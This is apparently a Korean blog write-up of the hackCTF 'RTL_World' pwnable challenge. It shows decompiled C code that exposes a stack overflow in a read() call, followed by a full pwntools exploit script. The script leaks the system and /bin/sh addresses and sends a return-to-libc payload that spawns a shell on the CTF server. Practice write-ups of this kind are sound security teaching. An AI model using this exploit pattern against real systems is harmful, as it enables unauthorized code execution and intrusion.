---
layout: post
title:  "[hackCTF]RTL_World"
date:   2020-02-18
categories: [hackCTF]
tags: [hackCTF]
permalink: '/hackCTF'
---

hackCTF pwnable 11번째 문제

![favicon](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/favicons.png?raw=true)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+10h] [ebp-90h]
  char buf; // [esp+14h] [ebp-8Ch]
  void * v6; // [esp+94h] [ebp-Ch]
  void * handle; // [esp+98h] [ebp-8h]
  void * s1; // [esp+9Ch] [ebp-4h]

  setvbuf(stdout, 0, 2, 0);
  handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1); // 동적 라이브러리 파일을 불러온다
  v6 = dlsym(handle, "system"); // system의 포인터를 v6에 저장한다
  dlclose(handle);
  for ( s1 = v6; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
    ; // "/bin/sh" 주소를 찾아서 s1에 저장한다
  puts("\n\nNPC [Village Presient] : ");
  puts("Binary Boss made our village fall into disuse...");
  puts("If you Have System Armor && Shell Sword.");
  puts("You can kill the Binary Boss...");
  puts("Help me Pwnable Hero... :(\n");
  printf("Your Gold : %d\n", gold);
  while ( 1 )
  {
    Menu();
    printf(">>> ");
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1: // checksec 결과
        system("clear");
        puts("[Binary Boss]\n");
        puts("Arch:     i386-32-little");
        puts("RELRO:    Partial RELRO");
        puts("Stack:    No canary found");
        puts("NX:       NX enabled");
        puts("PIE:      No PIE (0x8048000)");
        puts("ASLR:  Enable");
        printf("Binary Boss live in %p\n", handle);
        puts("Binart Boss HP is 140 + Armor + 4\n");
        break;
      case 2:
        Get_Money(gold);
        break;
      case 3: // gold가 2000 이상이면 system 주소(v6)를 알려준다
        if ( gold <= 1999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 1999;
          printf("System Armor : %p\n", v6);
        }
        break;
      case 4: // gold가 3000 이상이면 shell 주소(s1)를 알려준다
        if ( gold <= 2999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 2999;
          printf("Shell Sword : %p\n", s1);
        }
        break;
      case 5:
        printf("[Attack] > ");
        read(0, &buf, 0x400u); // 취약점!
        return 0;
      case 6:
        puts("Your Not Hero... Bye...");
        exit(0);
        return result;
      default:
        continue;
    }
  }
}
```

## ida - Get_Money
```c
int Get_Money()
{
  int result; // eax
  int v1; // [esp+8h] [ebp-Ch]
  int v2; // [esp+Ch] [ebp-8h]
  int v3; // [esp+10h] [ebp-4h]

  puts("\nThis world is F*cking JabonJui");
  puts("1) Farming...");
  puts("2) Item selling...");
  puts("3) Hunting...");
  v3 = 0;
  v2 = rand();
  printf("(Job)>>> ");
  __isoc99_scanf("%d", &v1);
  result = v1;
  if ( v1 == 2 ) // 350 gold 획득
  {
    puts("\nItem selling...");
    while ( v3 <= 350 )
      ++v3;
    puts("+ 350 Gold");
    gold += v3;
    result = printf("\nYour Gold is %d\n", gold);
  }
  else if ( v1 > 2 )
  {
    if ( v1 == 3 ) // 500 gold 획득
    {
      puts("\nHunting...");
      while ( v3 <= 500 )
        ++v3;
      puts("+ 500 Gold");
      gold += v3;
      result = printf("\nYour Gold is %d\n", gold);
    }
    else if ( v1 == 4 ) // random 값의 gold 획득
    {
      puts("\nWow! you can find Hidden number!");
      puts("Life is Just a One Shot...");
      puts("Gambling...");
      printf("+ %d Gold\n", v2);
      gold += v2;
      result = printf("\nYour Gold is %d\n", gold);
    }
  }
  else if ( v1 == 1 ) // 100 gold 획득
  {
    puts("\nFarming...");
    while ( v3 <= 100 )
      ++v3;
    puts("+ 100 Gold");
    gold += v3;
    result = printf("\nYour Gold is %d\n", gold);
  }
  return result;
}
```

## ida - Menu
```c
int Menu()
{
  puts("======= Welcome to RTL World =======");
  puts("1) Information the Binary Boss!");
  puts("2) Make Money");
  puts("3) Get the System Armor");
  puts("4) Get the Shell Sword");
  puts("5) Kill the Binary Boss!!!");
  puts("6) Exit");
  return puts("====================================");
}
```

기초적인 RTL 문제. main의 2번 메뉴에서 gold를 획득한 다음 3,4번 메뉴에서 system과 shell의 주소를 알아낸다. payload를 완성하면 5번 메뉴에서 공격할 수 있다.  
ASLR이 적용되어 있으므로 exploit.py에서 system과 shell 주소를 알아내야 한다는 점을 참고하자.


## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3010)

# Get_Money

p.recvuntil(">>> ")

p.sendline("2")

p.recvuntil("(Job)>>> ")

p.sendline("4")

# system

p.recvuntil(">>> ")

p.sendline("3")

p.recvuntil("System Armor : ")

system = int(p.recv(10), 16)

# shell

p.recvuntil(">>> ")

p.sendline("4")

p.recvuntil("Shell Sword : ")

shell = int(p.recv(10), 16)

# Attack

p.recvuntil(">>> ")

p.sendline("5")

payload = "A"*(0x8c+0x4) + p32(system) + "AAAA" + p32(shell)

p.send(payload)

p.interactive()
```
## 결과
![1101](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/hackCTF/1101.JPG?raw=true)
